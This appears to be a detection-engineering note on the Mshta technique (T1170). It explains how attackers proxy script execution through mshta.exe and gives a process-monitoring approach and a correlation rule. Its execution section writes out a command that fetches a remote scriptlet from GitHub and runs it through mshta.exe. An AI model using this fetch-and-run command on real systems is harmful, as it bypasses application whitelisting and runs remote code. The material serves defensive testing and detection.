Technique Description: Mshta (T1170)
------------------------------------
Mshta.exe is used to execute Microsoft HTML Applications (HTA). Attackers use mshta.exe to proxy execution of malicious files and Javascript or VBscript by going through Windows utility.  Mshta.exe can bypass application whitelisting.

Assumptions 
-------------
We assume that the attacker already has access to the target machine to run the mshta.exe command as a proxy to run a script.

Execution
-------------
From cmd line: mshta.exe javascript:a=(GetObject('script: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1170/mshta.sct')).Exec();close();

 Detection 
-------------
Process monitor to monitor for execution of mshta.exe using command line raw or an obfuscated script.

Visibility 
-------------
mshta.exe

### Filter/ Correlation Rule ###
EventCode=4658 OR EventCode=3 AND mshta.exe 
![mshta](https://user-images.githubusercontent.com/32250546/55584524-5b93d480-56f2-11e9-9e99-863e684054c4.png)
